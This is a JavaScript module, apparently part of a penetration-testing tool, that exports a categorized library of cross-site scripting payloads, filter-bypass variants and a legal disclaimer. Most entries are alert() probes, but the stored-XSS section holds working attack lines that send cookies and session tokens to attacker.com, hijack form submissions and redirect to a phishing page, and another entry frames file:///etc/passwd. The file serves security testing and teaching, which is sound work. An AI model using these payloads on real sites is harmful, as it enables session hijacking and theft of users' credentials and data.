// XSS (Cross-Site Scripting) Payload Generator - Educational Penetration Testing Tool
// WARNING: For authorized testing and educational purposes only

export const xssPayloads = {
  storedXSS: {
    name: 'Stored XSS Payloads',
    description: 'XSS payloads stored in database and executed for all users',
    category: 'Stored XSS',
    payloads: [
      {
        name: 'Basic alert box',
        code: '<script>alert("XSS")</script>'
      },
      {
        name: 'Cookie stealer',
        code: '<script>new Image().src="http://attacker.com/steal.php?cookie="+document.cookie;</script>'
      },
      {
        name: 'Redirect to phishing',
        code: '<script>window.location="http://attacker.com/phishing";</script>'
      },
      {
        name: 'Form hijacking',
        code: '<script>document.forms[0].action="http://attacker.com/steal";document.forms[0].submit();</script>'
      },
      {
        name: 'Session token theft',
        code: '<script>fetch("http://attacker.com/?token="+document.cookie);</script>'
      }
    ]
  },
  reflectedXSS: {
    name: 'Reflected XSS Payloads',
    description: 'XSS reflected in immediate response (URL-based)',
    category: 'Reflected XSS',
    payloads: [
      {
        name: 'Simple alert in URL',
        code: '<script>alert("Reflected XSS")</script>'
      },
      {
        name: 'URL parameter injection',
        code: '?search=<script>alert("XSS")</script>'
      },
      {
        name: 'Image onerror',
        code: '?image=<img src=x onerror="alert(\'XSS\')">'
      },
      {
        name: 'SVG payload',
        code: '?data=<svg onload=alert("XSS")>'
      },
      {
        name: 'Base64 encoded',
        code: '?msg=PHNjcmlwdD5hbGVydCgiWFNTIik8L3NjcmlwdD4='
      }
    ]
  },
  eventHandlers: {
    name: 'Event Handler XSS',
    description: 'XSS using HTML event handlers',
    category: 'Event Handlers',
    payloads: [
      {
        name: 'Image onerror',
        code: '<img src=x onerror="alert(\'XSS\')">'
      },
      {
        name: 'Body onload',
        code: '<body onload="alert(\'XSS\')">'
      },
      {
        name: 'Input onchange',
        code: '<input onfocus="alert(\'XSS\')" autofocus>'
      },
      {
        name: 'SVG onload',
        code: '<svg onload="alert(\'XSS\')">'
      },
      {
        name: 'iframe onload',
        code: '<iframe onload="alert(\'XSS\')">'
      },
      {
        name: 'Marquee onstart',
        code: '<marquee onstart="alert(\'XSS\')">'
      }
    ]
  },
  attributeInjection: {
    name: 'Attribute Injection XSS',
    description: 'XSS through HTML attribute injection',
    category: 'Attribute Injection',
    payloads: [
      {
        name: 'Event in href',
        code: '<a href="javascript:alert(\'XSS\')">Click</a>'
      },
      {
        name: 'Data URI with script',
        code: '<a href="data:text/html,<script>alert(\'XSS\')</script>">Click</a>'
      },
      {
        name: 'Style expression (IE)',
        code: '<div style="background:url(javascript:alert(\'XSS\'))">content</div>'
      },
      {
        name: 'Form action hijack',
        code: '<form action="http://attacker.com">'
      },
      {
        name: 'Meta refresh',
        code: '<meta http-equiv="refresh" content="0;url=javascript:alert(\'XSS\')">'
      }
    ]
  },
  domBased: {
    name: 'DOM-based XSS',
    description: 'XSS through DOM manipulation',
    category: 'DOM-based XSS',
    payloads: [
      {
        name: 'innerHTML injection',
        code: '<script>document.body.innerHTML += "<img src=x onerror=alert(\'XSS\')>"</script>'
      },
      {
        name: 'innerHTML via eval',
        code: '<script>eval(document.location.hash.substring(1))</script>'
      },
      {
        name: 'appendChild with script',
        code: '<script>var s=document.createElement("script");s.textContent="alert(\'XSS\')";document.body.appendChild(s);</script>'
      },
      {
        name: 'document.write injection',
        code: '<script>document.write("<img src=x onerror=alert(\'XSS\')>")</script>'
      }
    ]
  },
  bypassTechniques: {
    name: 'WAF/Filter Bypass',
    description: 'XSS payloads to bypass filters and WAF',
    category: 'Bypass Techniques',
    payloads: [
      {
        name: 'Case manipulation',
        code: '<ScRiPt>alert("XSS")</sCrIpT>'
      },
      {
        name: 'HTML entity encoding',
        code: '&lt;script&gt;alert("XSS")&lt;/script&gt;'
      },
      {
        name: 'Unicode encoding',
        code: '<script>alert("\\u0058\\u0053\\u0053")</script>'
      },
      {
        name: 'Hex encoding',
        code: '<img src=x onerror="alert(\\x27XSS\\x27)">'
      },
      {
        name: 'Double URL encoding',
        code: '%253Cscript%253Ealert%28%2522XSS%2522%29%253C%252Fscript%253E'
      },
      {
        name: 'Null byte injection',
        code: '<script>alert("XSS")</script><img src=x onerror="alert(\'XSS\')">'
      }
    ]
  },
  svgBased: {
    name: 'SVG-based XSS',
    description: 'XSS using SVG vectors',
    category: 'SVG Vectors',
    payloads: [
      {
        name: 'SVG script tag',
        code: '<svg><script>alert("XSS")</script></svg>'
      },
      {
        name: 'SVG animate',
        code: '<svg><animate onbegin="alert(\'XSS\')" attributeName="x" dur="1s" />'
      },
      {
        name: 'SVG foreignObject',
        code: '<svg><foreignObject><iframe srcdoc="<script>alert(\'XSS\')</script>"></iframe></foreignObject></svg>'
      },
      {
        name: 'SVG use xlink',
        code: '<svg><use xlink:href="data:image/svg+xml,<svg onload=alert(\'XSS\')>"/></svg>'
      }
    ]
  },
  protocolHandlers: {
    name: 'Protocol Handler XSS',
    description: 'XSS using custom protocol handlers',
    category: 'Protocol Handlers',
    payloads: [
      {
        name: 'JavaScript protocol',
        code: '<a href="javascript:alert(\'XSS\')">Click</a>'
      },
      {
        name: 'Data URL with script',
        code: '<iframe src="data:text/html,<script>alert(\'XSS\')</script>"></iframe>'
      },
      {
        name: 'Vbscript protocol (IE)',
        code: '<img src="vbscript:msgbox(\'XSS\')">'
      },
      {
        name: 'File protocol',
        code: '<iframe src="file:///etc/passwd"></iframe>'
      }
    ]
  },
  contextSpecific: {
    name: 'Context-Specific XSS',
    description: 'XSS payloads for specific HTML contexts',
    category: 'Context-Specific',
    payloads: [
      {
        name: 'Script attribute context',
        code: '"; alert("XSS"); var x = "'
      },
      {
        name: 'HTML attribute context',
        code: '" onload="alert(\'XSS\')" x="'
      },
      {
        name: 'URL context',
        code: 'javascript:alert("XSS")'
      },
      {
        name: 'CSS context',
        code: 'expression(alert("XSS"))'
      },
      {
        name: 'JSON context',
        code: '{"key":"\\"; alert(\'XSS\'); //}"}'
      }
    ]
  }
}

export const testingPayloads = {
  detection: [
    '<script>alert("XSS")</script>',
    '"><script>alert("XSS")</script>',
    "'-alert('XSS')-'",
    '<img src=x onerror="alert(\'XSS\')">'
  ],
  basic: [
    '<script>alert(1)</script>',
    '<img src=x onerror=alert(1)>',
    '<svg onload=alert(1)>',
    '<iframe onload=alert(1)>'
  ]
}

export const getAllCategories = () => {
  const categories = new Set()
  Object.values(xssPayloads).forEach(payload => {
    categories.add(payload.category)
  })
  return Array.from(categories).sort()
}

export const getPayloadsByCategory = (category) => {
  return Object.entries(xssPayloads).filter(
    ([, payload]) => payload.category === category
  )
}

export const disclaimer = `
⚠️  DISCLAIMER & LEGAL NOTICE ⚠️

XSS (Cross-Site Scripting) attacks can be extremely dangerous and result in:
• Session hijacking and credential theft
• Malware distribution
• Website defacement
• Stealing sensitive user data
• Financial fraud and identity theft
• Complete account compromise

This tool is for AUTHORIZED SECURITY TESTING & EDUCATIONAL PURPOSES ONLY.

Only use this tool if you:
✓ Have explicit written authorization from the system owner
✓ Are testing your own systems or systems you own
✓ Are in an authorized penetration testing engagement
✓ Understand the legal implications in your jurisdiction

Unauthorized XSS attacks are ILLEGAL and may result in:
• Criminal prosecution
• Civil liability
• Imprisonment
• Significant fines
• Permanent criminal record

By using this tool, you acknowledge responsibility for your actions.
`
